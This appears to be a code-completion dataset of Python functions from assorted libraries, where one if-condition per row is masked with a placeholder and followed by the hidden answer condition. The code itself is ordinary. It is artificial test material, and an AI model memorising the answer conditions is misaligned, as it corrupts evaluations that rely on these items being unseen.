3342,"def removeNamedItemNS(self, namespaceURI, localName):<tab>n = self.getNamedItemNS(namespaceURI, localName)<tab>if n is not None:<tab><tab>_clear_id_cache(self._ownerElement)<tab><tab>del self._attrsNS[(n.namespaceURI, n.localName)]<tab><tab>del self._attrs[n.nodeName]<tab><tab><IF-STMT><tab><tab><tab>n.ownerElement = None<tab><tab>return n<tab>else:<tab><tab>raise xml.dom.NotFoundErr()","if hasattr ( n , ""ownerElement"" ) :",129
3343,"def __find_image(self, relpath):<tab>image_path = None<tab>for rp in self._resource_paths:<tab><tab>for root, dirs, files in os.walk(rp):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>image_path = os.path.join(root, relpath)<tab><tab><tab><tab>break<tab><tab>if image_path is not None:<tab><tab><tab>break<tab>return image_path",if relpath in files :,101
3344,"def get_config_value(self, path, raise_if_not_found=True):<tab>if not path.is_concrete():<tab><tab>raise ValueError(""Can't access config by masked path: %s"" % path)<tab>cfg = self._config<tab>for key in path:<tab><tab>if key not in cfg:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(""Key not found: %r"" % key)<tab><tab><tab>else:<tab><tab><tab><tab>return None<tab><tab>cfg = cfg[key]<tab>return cfg",if raise_if_not_found :,132
3345,"def unbind(**kwargs):<tab>for event, callback in kwargs.items():<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Unknown {!r} event"".format(event))<tab><tab>else:<tab><tab><tab>for listener in _callbacks[event][:]:<tab><tab><tab><tab>if listener.callback == callback:<tab><tab><tab><tab><tab>_callbacks[event].remove(listener)<tab><tab><tab><tab><tab>if event == ""on_new_intent"":<tab><tab><tab><tab><tab><tab>_activity.unregisterNewIntentListener(listener)<tab><tab><tab><tab><tab>elif event == ""on_activity_result"":<tab><tab><tab><tab><tab><tab>_activity.unregisterActivityResultListener(listener)",if event not in _callbacks :,156
3346,"def _escape_attrib(text):<tab># escape attribute value<tab>try:<tab><tab>if ""&"" in text:<tab><tab><tab>text = text.replace(""&"", ""&amp;"")<tab><tab>if ""<"" in text:<tab><tab><tab>text = text.replace(""<"", ""&lt;"")<tab><tab>if "">"" in text:<tab><tab><tab>text = text.replace("">"", ""&gt;"")<tab><tab><IF-STMT><tab><tab><tab>text = text.replace('""', ""&quot;"")<tab><tab>if ""\n"" in text:<tab><tab><tab>text = text.replace(""\n"", ""&#10;"")<tab><tab>return text<tab>except (TypeError, AttributeError):  # pragma: no cover<tab><tab>_raise_serialization_error(text)","if '""' in text :",160
3347,"def _get_options(self, kwargs):<tab>options = {}<tab>for option in self._options:<tab><tab><IF-STMT><tab><tab><tab>self._validate_option(option, kwargs[option])<tab><tab><tab>options[option] = kwargs[option]<tab><tab>else:<tab><tab><tab>options[option] = getattr(self, ""_"" + option)<tab>return options",if option in kwargs :,88
3348,"def _parse_version_parts(s):<tab>for part in component_re.split(s):<tab><tab>part = replace(part, part)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if part[:1] in ""0123456789"":<tab><tab><tab>yield part.zfill(8)  # pad for numeric comparison<tab><tab>else:<tab><tab><tab>yield ""*"" + part<tab>yield ""*final""  # ensure that alpha/beta/candidate are before final","if part in [ """" , ""."" ] :",109
3349,def collect_deps(lib):<tab>queue = list(lib.deps_all)<tab>visited = set(queue)<tab>visited.add(lib)<tab>deps = []<tab># Traverse dependencies with breadth-first search.<tab>while queue:<tab><tab># Collect dependencies for next queue.<tab><tab>next_queue = []<tab><tab>for lib in queue:<tab><tab><tab>for dep in lib.deps_all:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>next_queue.append(dep)<tab><tab><tab><tab><tab>visited.add(dep)<tab><tab># Append current queue to result.<tab><tab>deps.append(collect_path_sorted_lib_idxs(queue))<tab><tab>queue = next_queue<tab>return deps,if dep not in visited :,174
3350,"def process_chunks(self, chunks):<tab>chunk_id = self._chunk_id<tab>self._chunk_id += len(chunks)<tab>chunk_data = []<tab>for chunk in chunks:<tab><tab><IF-STMT><tab><tab><tab>msg = ""Metric data exceeds maximum size of {} bytes. Dropping it."".format(<tab><tab><tab><tab>MAX_LINE_SIZE<tab><tab><tab>)<tab><tab><tab>wandb.termerror(msg, repeat=False)<tab><tab><tab>util.sentry_message(msg)<tab><tab>else:<tab><tab><tab>chunk_data.append(chunk.data)<tab>return {<tab><tab>""offset"": chunk_id,<tab><tab>""content"": chunk_data,<tab>}",if len ( chunk . data ) > MAX_LINE_SIZE :,177
3351,"def truncateLogFile():<tab>global logfilename<tab>logger.warn(""Truncating log file %s"" % logfilename)<tab>with open(logfilename, ""w"") as f:<tab><tab>f.write("""")<tab>for i in range(1, 25):<tab><tab>rotatedFilename = ""%s.%d"" % (logfilename, i)<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Deleting rotated file %s"" % rotatedFilename)<tab><tab><tab>os.unlink(rotatedFilename)",if os . path . exists ( rotatedFilename ) :,121
3352,"def _page_contains(self, text):<tab>browser = self._current_browser()<tab>browser.switch_to_default_content()<tab>if self._is_text_present(text):<tab><tab>return True<tab>subframes = self._element_find(""xpath=//frame|//iframe"", False, False)<tab>self._debug(""Current frame has %d subframes"" % len(subframes))<tab>for frame in subframes:<tab><tab>browser.switch_to_frame(frame)<tab><tab>found_text = self._is_text_present(text)<tab><tab>browser.switch_to_default_content()<tab><tab><IF-STMT><tab><tab><tab>return True<tab>return False",if found_text :,163
3353,"def get_project_name_git():<tab>is_git = check_output([""git"", ""rev-parse"", ""--git-dir""], stderr=subprocess.STDOUT)<tab>if is_git:<tab><tab>project_address = check_output(<tab><tab><tab>[""git"", ""config"", ""--local"", ""remote.origin.url""]<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>project_address = project_address.decode()<tab><tab>project_name = [i for i in re.split(r""[/:\s\\]|\.git"", project_address) if i][<tab><tab><tab>-1<tab><tab>]<tab><tab>return project_name.strip()","if isinstance ( project_address , bytes ) and str != bytes :",164
3354,"def timer(ratio, step, additive):<tab>t = 0<tab>slowmode = False<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>slowmode |= bool((yield t))<tab><tab>else:<tab><tab><tab>slowmode = bool((yield t))<tab><tab>if slowmode:<tab><tab><tab>t += step * ratio<tab><tab>else:<tab><tab><tab>t += step",if additive :,89
3355,"def _call_connection_lost(self, exc):<tab>try:<tab><tab>if self._protocol_connected:<tab><tab><tab>self._protocol.connection_lost(exc)<tab>finally:<tab><tab>self._sock.close()<tab><tab>self._sock = None<tab><tab>self._protocol = None<tab><tab>self._loop = None<tab><tab>server = self._server<tab><tab><IF-STMT><tab><tab><tab>server._detach()<tab><tab><tab>self._server = None",if server is not None :,112
3356,def _think(self):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>random.choice(self.peers.values()).send_getaddrs(count=8)<tab>except:<tab><tab>log.err()<tab>return random.expovariate(1 / 20),if len ( self . addr_store ) < self . preferred_storage and self . peers :,84
3357,def merge_force_collapse(self):<tab>p = self.pending<tab>while len(p) > 1:<tab><tab><IF-STMT><tab><tab><tab>self.merge_at(-3)<tab><tab>else:<tab><tab><tab>self.merge_at(-2),if len ( p ) >= 3 and p [ - 3 ] . len < p [ - 1 ] . len :,79
3358,"def ensure_echo_on():<tab>if termios:<tab><tab>fd = sys.stdin<tab><tab>if fd.isatty():<tab><tab><tab>attr_list = termios.tcgetattr(fd)<tab><tab><tab>if not attr_list[3] & termios.ECHO:<tab><tab><tab><tab>attr_list[3] |= termios.ECHO<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>old_handler = signal.signal(signal.SIGTTOU, signal.SIG_IGN)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>old_handler = None<tab><tab><tab><tab>termios.tcsetattr(fd, termios.TCSANOW, attr_list)<tab><tab><tab><tab>if old_handler is not None:<tab><tab><tab><tab><tab>signal.signal(signal.SIGTTOU, old_handler)","if hasattr ( signal , ""SIGTTOU"" ) :",197
3359,"def change_palette_name(self, palette_name):<tab>if isinstance(palette_name, str):<tab><tab><IF-STMT><tab><tab><tab>log.info(""Palette name %s not found"", palette_name)<tab><tab><tab>return<tab><tab>log.debug(""Settings palette name to %s"", palette_name)<tab><tab>self.settings.styleFont.set_string(""palette"", PALETTES[palette_name])<tab><tab>self.settings.styleFont.set_string(""palette-name"", palette_name)<tab><tab>self.set_colors_from_settings()",if palette_name not in PALETTES :,142
3360,"def nested_match(expect, value):<tab>if expect == value:<tab><tab>return True<tab>if isinstance(expect, dict) and isinstance(value, dict):<tab><tab>for k, v in expect.items():<tab><tab><tab>if k in value:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab><tab>return True<tab>if isinstance(expect, list) and isinstance(value, list):<tab><tab>for x, y in zip(expect, value):<tab><tab><tab>if not nested_match(x, y):<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False","if not nested_match ( v , value [ k ] ) :",162
3361,"def _on_event(self, event):<tab>event_id = event[""event_id""]<tab>if event_id == MpvEventID.END_FILE:<tab><tab>reason = event[""event""][""reason""]<tab><tab>logger.debug(""Current song finished. reason: %d"" % reason)<tab><tab><IF-STMT><tab><tab><tab>self.media_finished.emit()<tab>elif event_id == MpvEventID.FILE_LOADED:<tab><tab>self.media_loaded.emit()",if self . state != State . stopped and reason != MpvEventEndFile . ABORTED :,131
3362,"def __exit__(self, exc_type, exc_value, traceback):<tab>self.close()<tab>with DB.connection_context():<tab><tab>rows = (<tab><tab><tab>SessionRecord.delete()<tab><tab><tab>.where(SessionRecord.f_session_id == self._session_id)<tab><tab><tab>.execute()<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>LOGGER.debug(f""delete session {self._session_id} record"")<tab><tab>else:<tab><tab><tab>LOGGER.warning(f""failed delete session {self._session_id} record"")",if rows > 0 :,138
3363,"def decorator(*args, **kwargs):<tab># Sets a boolean on the global request context<tab>g._flask_user_allow_unconfirmed_email = True<tab># Catch exceptions to properly unset boolean on exceptions<tab>try:<tab><tab>user_manager = current_app.user_manager<tab><tab># User must be logged in with a confirmed email address<tab><tab>allowed = _is_logged_in_with_confirmed_email(user_manager)<tab><tab><IF-STMT><tab><tab><tab># Redirect to unauthenticated page<tab><tab><tab>return user_manager.unauthenticated_view()<tab><tab># It's OK to call the view<tab><tab>return view_function(*args, **kwargs)<tab>finally:<tab><tab># Allways unset the boolean, whether exceptions occurred or not<tab><tab>g._flask_user_allow_unconfirmed_email = False",if not allowed :,190
3364,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_limit(d.getVarInt64())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 16 :,122
3365,"def addOptions(parser):<tab>for optname in options.keys(""default""):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>action = ""store_true"" if options[optname] is False else ""store""<tab><tab>try:<tab><tab><tab>parser.add_argument(<tab><tab><tab><tab>""--"" + optname.replace(""_"", ""-""),<tab><tab><tab><tab>action=action,<tab><tab><tab><tab>dest=optname,<tab><tab><tab><tab>default=None,<tab><tab><tab><tab>help=options._opts._get(optname).helpstr,<tab><tab><tab>)<tab><tab>except argparse.ArgumentError:<tab><tab><tab>pass","if optname . startswith ( ""color_"" ) or optname . startswith ( ""disp_"" ) :",152
3366,"def make_relative_to(self, kwds, relative_to):<tab>if relative_to and os.path.dirname(relative_to):<tab><tab>dirname = os.path.dirname(relative_to)<tab><tab>kwds = kwds.copy()<tab><tab>for key in ffiplatform.LIST_OF_FILE_NAMES:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>lst = kwds[key]<tab><tab><tab><tab>if not isinstance(lst, (list, tuple)):<tab><tab><tab><tab><tab>raise TypeError(""keyword '%s' should be a list or tuple"" % (key,))<tab><tab><tab><tab>lst = [os.path.join(dirname, fn) for fn in lst]<tab><tab><tab><tab>kwds[key] = lst<tab>return kwds",if key in kwds :,173
3367,"def _options_fcheck(self, name, xflags, table):<tab>for entry in table:<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if entry.flags & XTOPT_MAND and not xflags & (1 << entry.id):<tab><tab><tab>raise XTablesError(""%s: --%s must be specified"" % (name, entry.name))<tab><tab><tab>if not xflags & (1 << entry.id):<tab><tab><tab><tab>continue",if entry . name is None :,112
3368,"def _load_cmds():<tab>prefix = ""AOE_CMD_""<tab>g = globals()<tab>for k, v in iteritems(g):<tab><tab><IF-STMT><tab><tab><tab>name = ""aoe"" + k[len(prefix) :].lower()<tab><tab><tab>try:<tab><tab><tab><tab>mod = __import__(name, g, level=1)<tab><tab><tab><tab>AOE.set_cmd(v, getattr(mod, name.upper()))<tab><tab><tab>except (ImportError, AttributeError):<tab><tab><tab><tab>continue",if k . startswith ( prefix ) :,128
3369,"def test_list_sizes(self):<tab>sizes = self.driver.list_sizes()<tab>self.assertEqual(len(sizes), 7, ""Wrong sizes count"")<tab>for size in sizes:<tab><tab>self.assertTrue(isinstance(size.price, float), ""Wrong size price type"")<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(size.price, 0, ""Size price should be zero by default"")","if self . driver . api_name == ""openstack"" :",105
3370,"def testToFileBinary(self):<tab>z = dns.zone.from_file(here(""example""), ""example"")<tab>try:<tab><tab>f = open(here(""example3-binary.out""), ""wb"")<tab><tab>z.to_file(f)<tab><tab>f.close()<tab><tab>ok = compare_files(<tab><tab><tab>""testToFileBinary"", here(""example3-binary.out""), here(""example3.good"")<tab><tab>)<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>os.unlink(here(""example3-binary.out""))<tab>self.assertTrue(ok)",if not _keep_output :,146
3371,"def ip_list(_):<tab>ips = []<tab>for ip in _.split("" ""):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif isip(ip):<tab><tab><tab>ips.append(IP.create(ip))<tab><tab>else:<tab><tab><tab>raise TypeError(""ip %s is invalid"" % ip)<tab>return ips",if not ip :,82
3372,"def _wait_for_state(self, server_id, state, retries=50):<tab>for i in (0, retries):<tab><tab>server = self.ex_get_server(server_id)<tab><tab>if server.extra[""status""][""state""] == state:<tab><tab><tab>return<tab><tab>sleep(5)<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Retries count reached"")",if i == retries :,95
3373,"def _stretch_prev(data):<tab>clip, track, item_id, item_data = data<tab>try:<tab><tab>prev_index = track.clips.index(clip) - 1<tab><tab>if prev_index < 0:<tab><tab><tab>return  # clip is first clip<tab><tab><IF-STMT><tab><tab><tab># Next clip is blank so we can do this.<tab><tab><tab>clip = track.clips[prev_index]<tab><tab><tab>data = (clip, track, item_id, item_data)<tab><tab><tab>_cover_blank_from_next(data, True)<tab>except:<tab><tab>pass  # any error means that this can't be done",if track . clips [ prev_index ] . is_blanck_clip == True :,173
3374,"def characters(self, ch):<tab>if self._inside_fuzzable:<tab><tab>modified_value = self._fuzzed_parameters[self._fuzzable_index][1]<tab><tab><IF-STMT><tab><tab><tab>modified_value = modified_value.get_value()<tab><tab>if self._fuzzed_parameters[self._fuzzable_index][0] == ""base64"":<tab><tab><tab>enc_val = base64.b64encode(modified_value)<tab><tab>else:<tab><tab><tab>enc_val = cgi.escape(modified_value).encode(""ascii"", ""xmlcharrefreplace"")<tab><tab>self.fuzzed_xml_string += enc_val<tab>else:<tab><tab>self.fuzzed_xml_string += ch","if isinstance ( modified_value , DataToken ) :",181
3375,"def _make_sure_scheduler_ready(self, timeout=120):<tab>check_start_time = time.time()<tab>while True:<tab><tab>workers_meta = self._scheduler_service._resource_ref.get_workers_meta()<tab><tab><IF-STMT><tab><tab><tab># wait for worker to report status<tab><tab><tab>self._pool.sleep(0.5)<tab><tab><tab>if time.time() - check_start_time > timeout:  # pragma: no cover<tab><tab><tab><tab>raise TimeoutError(""Check worker ready timed out."")<tab><tab>else:<tab><tab><tab>break",if not workers_meta :,139
3376,"def tiles_around(self, pos, radius=1, predicate=None):<tab>ps = []<tab>x, y = pos<tab>for dx in range(-radius, radius + 1):<tab><tab>nx = x + dx<tab><tab>if nx >= 0 and nx < self.width:<tab><tab><tab>for dy in range(-radius, radius + 1):<tab><tab><tab><tab>ny = y + dy<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>if predicate is None or predicate((nx, ny)):<tab><tab><tab><tab><tab><tab>ps.append((nx, ny))<tab>return ps",if ny >= 0 and ny < self . height and ( dx != 0 or dy != 0 ) :,151
3377,"def tearDown(self):<tab>for i in ScriptVersion.objects.all():<tab><tab>name = i.script_path.name<tab><tab>utils.get_storage().delete(name)<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>utils.get_storage(local=False).delete(name)<tab><tab><tab>except WindowsError:<tab><tab><tab><tab>print(""unable to delete {}"".format(name))<tab><tab>name += ""c""  # handle pyc junk<tab><tab>try:<tab><tab><tab>utils.get_storage().delete(name)<tab><tab>except WindowsError:<tab><tab><tab>print(""unable to delete {}"".format(name))<tab>super(ScriptTearDown, self).tearDown()",if wooey_settings . WOOEY_EPHEMERAL_FILES :,177
3378,"def _fill_tc_results(self):<tab>tids = list(self.tc._results.keys())<tab>fields = [""failures"", ""errors"", ""skipped"", ""expectedFailures""]<tab>for tid in tids:<tab><tab>result = self.tc._results[tid]<tab><tab>for field in fields:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.tc._results[field] = []<tab><tab><tab>self.tc._results[field].extend(result[field])",if not field in self . tc . _results :,119
3379,"def check_mixin_inheritance(bases):<tab>for b in bases:<tab><tab>check_mixin_inheritance(b.__bases__)<tab><tab>for k, v in vars(b).items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_type_info[k] = _process_item(v)","if _is_interesting ( k , v ) :",78
3380,"def _check_params(swa_freq):<tab>params = [swa_freq]<tab>params_none = [param is None for param in params]<tab>if not all(params_none) and any(params_none):<tab><tab>warnings.warn(""Some of swa_start, swa_freq is None, ignoring other"")<tab>for i, param in enumerate(params):<tab><tab><IF-STMT><tab><tab><tab>params[i] = int(param)<tab><tab><tab>warnings.warn(""Casting swa_start, swa_freq to int"")<tab>return not any(params_none), params","if param is not None and not isinstance ( param , int ) :",145
3381,"def findBookmark(self, bookmark, root=None):<tab>if root == None:<tab><tab>root = self.bookmarks<tab>for i, b in enumerate(root):<tab><tab>if isinstance(b, list):<tab><tab><tab>res = self.findBookmark(bookmark, b)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return [i] + res<tab><tab>elif b == bookmark or b[""/Title""] == bookmark:<tab><tab><tab>return [i]<tab>return None",if res :,116
3382,"def best_match(self, matches, default=None):<tab>best_quality = -1<tab>result = default<tab>for server_item in matches:<tab><tab>for client_item, quality in self:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>if self._value_matches(server_item, client_item) and quality > 0:<tab><tab><tab><tab>best_quality = quality<tab><tab><tab><tab>result = server_item<tab>return result",if quality <= best_quality :,113
3383,"def validate_external_users(self):<tab>if self.user and settings.ALLOW_OAUTH2_FOR_EXTERNAL_USERS is False:<tab><tab>external_account = get_external_account(self.user)<tab><tab><IF-STMT><tab><tab><tab>raise oauth2.AccessDeniedError(<tab><tab><tab><tab>_(<tab><tab><tab><tab><tab>""OAuth2 Tokens cannot be created by users associated with an external authentication provider ({})""<tab><tab><tab><tab>).format(external_account)<tab><tab><tab>)",if external_account is not None :,118
3384,def get_tzname(self):<tab># Timezone conversions must happen to the input datetime *before*<tab># applying a function. 2015-12-31 23:00:00 -02:00 is stored in the<tab># database as 2016-01-01 01:00:00 +00:00. Any results should be<tab># based on the input datetime not the stored datetime.<tab>tzname = None<tab>if settings.USE_TZ:<tab><tab><IF-STMT><tab><tab><tab>tzname = timezone.get_current_timezone_name()<tab><tab>else:<tab><tab><tab>tzname = timezone._get_timezone_name(self.tzinfo)<tab>return tzname,if self . tzinfo is None :,158
3385,"def _get_editable_fields(cls):<tab>fds = set([])<tab>for field in cls._meta.concrete_fields:<tab><tab>if hasattr(field, ""attname""):<tab><tab><tab>if field.attname == ""id"":<tab><tab><tab><tab>continue<tab><tab><tab>elif field.attname.endswith(""ptr_id""):<tab><tab><tab><tab># polymorphic fields should always be non-editable, see:<tab><tab><tab><tab># https://github.com/django-polymorphic/django-polymorphic/issues/349<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fds.add(field.attname)<tab>return fds","if getattr ( field , ""editable"" , True ) :",159
3386,"def p_advsimd_secondary(val, va, mnem, opcode, flags, opers):<tab>if opcode == INS_VORR:<tab><tab>src1 = (val >> 16) & 0xF<tab><tab>src2 = (val) & 0xF<tab><tab><IF-STMT><tab><tab><tab>opers = (<tab><tab><tab><tab>ArmRegOper(rctx.getRegisterIndex(rbase % d)),<tab><tab><tab><tab>ArmRegOper(rctx.getRegisterIndex(rbase % n)),<tab><tab><tab>)<tab><tab><tab>return ""vmov"", INS_VMOV, None, opers<tab>return None, None, None, None",if src1 == src2 :,157
3387,"def list_urls(self):<tab>for idx, job in enumerate(self.urlwatcher.jobs):<tab><tab><IF-STMT><tab><tab><tab>print(""%d: %s"" % (idx + 1, repr(job)))<tab><tab>else:<tab><tab><tab>pretty_name = job.pretty_name()<tab><tab><tab>location = job.get_location()<tab><tab><tab>if pretty_name != location:<tab><tab><tab><tab>print(""%d: %s ( %s )"" % (idx + 1, pretty_name, location))<tab><tab><tab>else:<tab><tab><tab><tab>print(""%d: %s"" % (idx + 1, pretty_name))<tab>return 0",if self . urlwatch_config . verbose :,157
3388,"def _split_auth_string(auth_string):<tab>""""""split a digest auth string into individual key=value strings""""""<tab>prev = None<tab>for item in auth_string.split("",""):<tab><tab>try:<tab><tab><tab>if prev.count('""') == 1:<tab><tab><tab><tab>prev = ""%s,%s"" % (prev, item)<tab><tab><tab><tab>continue<tab><tab>except AttributeError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>prev = item<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>raise StopIteration<tab><tab>yield prev.strip()<tab><tab>prev = item<tab>yield prev.strip()<tab>raise StopIteration",if prev == None :,152
3389,"def _get_user_auth_session_cookie(self, url, username, password):<tab>get_response = requests.get(url)<tab># auth request to kfp server with istio dex look like '/dex/auth/local?req=REQ_VALUE'<tab>if ""auth"" in get_response.url:<tab><tab>credentials = {""login"": username, ""password"": password}<tab><tab># Authenticate user<tab><tab>session = requests.Session()<tab><tab>session.post(get_response.url, data=credentials)<tab><tab>cookie_auth_key = ""authservice_session""<tab><tab>cookie_auth_value = session.cookies.get(cookie_auth_key)<tab><tab><IF-STMT><tab><tab><tab>return cookie_auth_key + ""="" + cookie_auth_value",if cookie_auth_value :,187
3390,"def copychunked(src, dest):<tab>chunksize = 524288  # half a meg of bytes<tab>fsrc = src.open(""rb"")<tab>try:<tab><tab>fdest = dest.open(""wb"")<tab><tab>try:<tab><tab><tab>while 1:<tab><tab><tab><tab>buf = fsrc.read(chunksize)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>fdest.write(buf)<tab><tab>finally:<tab><tab><tab>fdest.close()<tab>finally:<tab><tab>fsrc.close()",if not buf :,131
3391,"def iterate_all_python_files(base_path):<tab># TODO support ignored directories/files<tab>for dirname, subdirlist, filelist in os.walk(base_path):<tab><tab>if ""__pycache__"" in dirname:<tab><tab><tab>continue<tab><tab>for filename in filelist:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield os.path.join(base_path, dirname, filename)","if filename . endswith ( "".py"" ) :",95
3392,"def discover(self, *objlist):<tab>ret = []<tab>for l in self.splitlines():<tab><tab>if l[0] != ""intr"":<tab><tab><tab>continue<tab><tab>for name, i in enumerate(l[2:]):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret.append(str(name))<tab>return ret",if int ( i ) > 10 :,84
3393,"def call_url(self, expected_url, with_error=False):<tab>try:<tab><tab>with self.best_url_selector.select_best_url() as url:<tab><tab><tab>self.assertEqual(urlparse(expected_url), url)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise RequestException(""error connecting to {}"".format(url))<tab>except RequestException:<tab><tab>pass",if with_error :,95
3394,"def __init__(self, action_space=None, network=None, network_kwargs=None, hparams=None):<tab>PolicyNetBase.__init__(self, hparams=hparams)<tab>with tf.variable_scope(self.variable_scope):<tab><tab><IF-STMT><tab><tab><tab>action_space = Space(low=0, high=self._hparams.action_space, dtype=np.int32)<tab><tab>self._action_space = action_space<tab><tab>self._append_output_layer()",if action_space is None :,120
3395,"def gettempfilename(suffix):<tab>""""""Returns a temporary filename""""""<tab>if ""_"" in os.environ:<tab><tab># tempfile.mktemp() crashes on some Wine versions (the one of Ubuntu 12.04 particularly)<tab><tab>if os.environ[""_""].find(""wine"") >= 0:<tab><tab><tab>tmpdir = "".""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>tmpdir = os.environ[""TMP""]<tab><tab><tab>import time<tab><tab><tab>import random<tab><tab><tab>random.seed(time.time())<tab><tab><tab>random_part = ""file%d"" % random.randint(0, 1000000000)<tab><tab><tab>return os.path.join(tmpdir, random_part + suffix)<tab>return tempfile.mktemp(suffix)","if ""TMP"" in os . environ :",172
3396,"def get_url(self):<tab>if self.url_patterns:<tab><tab>v_url = match1(self.html, *self.url_patterns)<tab><tab><IF-STMT><tab><tab><tab>v_url = compact_unquote(v_url)<tab><tab>self.v_url = [v_url]","if v_url . startswith ( ""http%3A"" ) :",83
3397,"def drain(self, fd):<tab>""""""Make `fd` unreadable.""""""<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab>except OSError:<tab><tab><tab>e = sys.exc_info()[1]<tab><tab><tab>if e.args[0] == errno.EAGAIN:<tab><tab><tab><tab>return<tab><tab><tab>raise","if not os . read ( fd , 4096 ) :",97
3398,"def tearDown(self):<tab># make sure all of the subprocesses are dead<tab>for pidfile in self.pidfiles:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>with open(pidfile) as f:<tab><tab><tab>pid = f.read()<tab><tab>if not pid:<tab><tab><tab>return<tab><tab>pid = int(pid)<tab><tab>try:<tab><tab><tab>os.kill(pid, signal.SIGKILL)<tab><tab>except OSError:<tab><tab><tab>pass<tab># and clean up leftover pidfiles<tab>for pidfile in self.pidfiles:<tab><tab>if os.path.exists(pidfile):<tab><tab><tab>os.unlink(pidfile)<tab>self.tearDownBasedir()",if not os . path . exists ( pidfile ) :,167
3399,"def main():<tab># Arguments<tab>input_fname, out_fname = sys.argv[1:]<tab># Do conversion.<tab>index = Indexes()<tab>offset = 0<tab>reader_wrapper = GFFReaderWrapper(fileinput.FileInput(input_fname), fix_strand=True)<tab>for feature in list(reader_wrapper):<tab><tab># Add feature; index expects BED coordinates.<tab><tab><IF-STMT><tab><tab><tab>convert_gff_coords_to_bed(feature)<tab><tab><tab>index.add(feature.chrom, feature.start, feature.end, offset)<tab><tab># Always increment offset, even if feature is not an interval and hence<tab><tab># not included in the index.<tab><tab>offset += feature.raw_size<tab>index.write(open(out_fname, ""wb""))","if isinstance ( feature , GenomicInterval ) :",199
3400,"def _s_wise_max(a_indices, a_indptr, vals, out_max):<tab>n = len(out_max)<tab>for i in range(n):<tab><tab><IF-STMT><tab><tab><tab>m = a_indptr[i]<tab><tab><tab>for j in range(a_indptr[i] + 1, a_indptr[i + 1]):<tab><tab><tab><tab>if vals[j] > vals[m]:<tab><tab><tab><tab><tab>m = j<tab><tab><tab>out_max[i] = vals[m]",if a_indptr [ i ] != a_indptr [ i + 1 ] :,138
3401,"def update_encryption_keys(self, options):<tab>if not options[""pools""] and not options[""datasets""]:<tab><tab>raise CallError(""Please specify pools/datasets to update"")<tab>async with ENCRYPTION_CACHE_LOCK:<tab><tab>keys = await self.encryption_keys()<tab><tab>for pool in options[""pools""]:<tab><tab><tab>keys[""geli""][pool[""name""]] = pool[""passphrase""]<tab><tab>for dataset in options[""datasets""]:<tab><tab><tab>keys[""zfs""][dataset[""name""]] = dataset[""passphrase""]<tab><tab>await self.middleware.call(""cache.put"", ""failover_encryption_keys"", keys)<tab><tab><IF-STMT><tab><tab><tab>await self.sync_keys_to_remote_node(lock=False)","if options [ ""sync_keys"" ] :",173
3402,"def set_lineno(self, lineno, override=False):<tab>""""""Set the line numbers of the node and children.""""""<tab>todo = deque([self])<tab>while todo:<tab><tab>node = todo.popleft()<tab><tab>if ""lineno"" in node.attributes:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>node.lineno = lineno<tab><tab>todo.extend(node.iter_child_nodes())<tab>return self",if node . lineno is None or override :,103
3403,"def is_ArAX_implicit(ii):  # allows one implicit fixed reg<tab>a, implicit_fixed = 0, 0<tab>for op in _gen_opnds(ii):<tab><tab><IF-STMT><tab><tab><tab>a += 1<tab><tab>elif op_reg(op) and op_implicit_specific_reg(op):<tab><tab><tab>implicit_fixed += 1<tab><tab>else:<tab><tab><tab>return False<tab>return a == 1 and implicit_fixed <= 1","if op_luf_start ( op , ""ArAX"" ) :",120
3404,"def __iter__(self):<tab>if hasattr(self, ""error_dict""):<tab><tab>for field, errors in self.error_dict.items():<tab><tab><tab>yield field, list(ValidationError(errors))<tab>else:<tab><tab>for error in self.error_list:<tab><tab><tab>message = error.message<tab><tab><tab><IF-STMT><tab><tab><tab><tab>message %= error.params<tab><tab><tab>yield force_text(message)",if error . params :,103
